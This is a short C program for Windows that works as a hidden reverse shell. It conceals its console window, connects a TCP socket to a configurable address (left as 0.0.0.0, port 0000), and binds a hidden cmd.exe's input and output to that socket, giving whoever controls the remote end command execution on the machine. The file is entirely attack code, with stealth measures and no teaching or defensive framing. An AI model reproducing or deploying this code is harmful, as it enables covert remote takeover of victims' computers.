#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment (lib, "Ws2_32.lib")







int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	SOCKET sock;
	struct sockaddr_in sock_addr;
    char recvserver[8000];
	WSADATA wsa;
	char ip_addr[] = "0.0.0.0";
	int port = 0000;
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); 




	WSAStartup(MAKEWORD(2,2),&wsa);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);


	sock_addr.sin_port = htons(port);
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    int connection = WSAConnect(sock, (SOCKADDR*)&sock_addr,sizeof(sock_addr),NULL,NULL,NULL,NULL);
    
    
    
    memset(&si,0,sizeof(si));
    recv(sock, recvserver, sizeof(recvserver), 0);  
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcess(NULL, "cmd",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    memset(recvserver,0,sizeof(recvserver));
    

}	